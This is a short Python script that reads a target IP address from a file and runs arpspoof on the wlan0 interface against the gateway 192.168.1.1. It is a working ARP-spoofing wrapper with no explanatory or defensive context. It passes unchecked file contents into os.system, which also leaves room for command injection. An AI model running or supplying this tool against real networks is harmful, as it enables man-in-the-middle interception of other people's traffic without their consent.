import os

f = open("target","r")
t = f.readline().replace("\n","")
f.close()

os.system("arpspoof -i wlan0 -t 192.168.1.1 " + t)